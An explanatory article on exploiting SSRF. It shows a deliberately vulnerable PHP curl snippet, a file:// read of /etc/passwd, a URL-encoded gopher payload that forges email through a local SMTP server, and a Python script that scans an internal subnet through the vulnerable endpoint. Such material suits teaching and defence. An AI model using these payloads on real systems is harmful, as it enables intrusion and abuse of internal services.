## Introduction

In the realm of cybersecurity, understanding vulnerabilities and how to exploit them is crucial. This article delves into the intricacies of Server Side Request Forgery (SSRF), a vulnerability that can be exploited to make a server perform requests on behalf of an attacker.

Indeed, the actions being done on the server-side, it is possible to query services that are only available locally such as:

- NoSQL databases such as Redis, MongoDB
- Relational databases such as Oracle, MSSQL, MySQL, PostgreSQL
- Mail services such as Postfix or Dovecot
- Web services usually accessible locally

This kind of flaw is particularly present on Web proxies. A user of the proxy service can have access to internal data present in the server to which he should not normally have had access.

* * *

## How to Exploit an SSRF Vulnerability?

We have seen above the example of exploiting a web proxy, but there is a multitude of attack patterns. The web proxy example uses the HTTP protocol to access the internal data on the machine. We are then entitled to ask ourselves a question "How to communicate with the other services such as the databases, the e-mail services, etc ...?"

**Let take the following example:**

```html
$curl = curl_init();
curl_setopt_array($curl, array(CURLOPT_URL => $_GET['url']));

$resp = curl_exec($curl);
curl_close($curl);
```

This example takes as input an address and retrieves the associated page, the **PHP Curl** module is a simple adaptation of the `curl http://example.com` system command. We can therefore use all the features of **Curl** in particular, those related to the semantics of the address sent to the script as per the following pattern: `[protocole]://[IP|URL]:[port]/[param]`.

- The protocol to use: HTTP, HTTPS, FTP, GOPHER, FILE, DICT, etc ...
- The address
- The remote port
- The parameter if required

If you need more information about the protocols implemented by **Curl** we invite you to check the [documentation](https://curl.se/docs/manpage.html) on the offical page.

### The file:// and http:// Protocol

A protocol should catch our attention. The `file://` protocol, which allows us to open a file on the server. Using the previous script, we can try to read the `/etc/passwd` file on the server.

The `file://` protocol allowed us to access files, but how can we communicate with some of the services present on the machine? The [article](https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html) written by [Nicolas Grégoire](https://twitter.com/Agarri_FR) give us some good example of SSRF allowing us to exploit a Redis database service.

Redis, like MongoDB, is a NoSQL database with no authentication by default. The article pointed above explains how, using HTTP requests, we can extract and modify the database or either read files on the system. The main concern of this method is that the HTTP request must have a specific format to be correct:

```html
GET /index.html
Host: www.neoslab.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
```

This format restricts the operation to service for example access to a service that needs a very precise preamble. Example of accessing the Redis database with an HTTP request:

```html
-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Connection:'
```

### The gopher:// Protocol

To overcome the format problem, we can use the `gopher://` protocol. Gopher is a concurrent HTTP protocol that is not used anymore but still supported by curl.

It will allow us to communicate through Telnet with services such as SMTP used when an email is sent. In the below example, we are trying to send an e-mail using the SMTP server available locally.

```html
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victim@site.com>
Date: Tue, 15 Sep 2020 17:20:26 -0400
Subject: Ah Ah AH

You did not say the magic word!


.
QUIT
```

If we convert the above request to a valid Gopher query it will become:

```html
https://victim.website/curl.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictim@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202020%2020%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
```

To move further and to test our SSRF, we set up a netcat server on port 25 which is associated with the SMTP protocol, and wait for the request to be executed:

```html
nc -lvp 25
listening on [any] 25 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 35417
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victim@site.com>
Date: Tue, 15 Sep 2020 17:20:26 -0400
Subject: AH AH AH

You did not say the magic word!


.
QUIT
```

* * *

## Enumeration of IP Addresses on the Local Network

We have seen in the previous sections that SSRF's act as a proxy to execute internal requests. They can then be used as a tool for the enumeration of the machines accessible through subnets network.

The only constraint is that the machine to be detected must have at least one service open. The most common services are often Web or SSH services using ports 80, 443, 8080, 22, or even RDP using port 3389 on the Windows system.

We can guess the accessible subnets thanks to the Apache configuration files **/etc/apache2/apache2.conf** or by looking in the IP address ranges of private networks:

- 10.0.0.0/8
- 172.16.0.0/12
- 192.168.0.0/16

To enumerate the available machines having an HTTP service on port 80, you can use the following `python` script:

```html
import requests

def ipRange(start_ip, end_ip):
   start = list(map(int, start_ip.split(".")))
   end = list(map(int, end_ip.split(".")))
   temp = start
   ip_range = []
   ip_range.append(start_ip)
   while temp != end:
      start[3] += 1
      for i in (3, 2, 1):
         if temp[i] == 256:
            temp[i] = 0
            temp[i-1] += 1
      ip_range.append(".".join(map(str, temp)))
   return ip_range

ip_range = ipRange("192.168.0.0", "192.168.255.255")
ip_up = []
for ip in ip_range:
    try:
        result = requests.get("http://victim.website/curl.php?url=http://"+ip+"/:80",timeout=0.5).content
        if(result is not ""):
            ip_up.append(ip)
            print "[+] Machine : "+ip
    except:
        pass

print("\n".join(ip_up))
```

* * *

##  Conclusion

Understanding SSRF and its potential for exploitation is vital for both attackers and defenders in the cybersecurity landscape. By comprehending the various bypass methods and exploitation techniques, one can better prepare and secure their systems against such threats.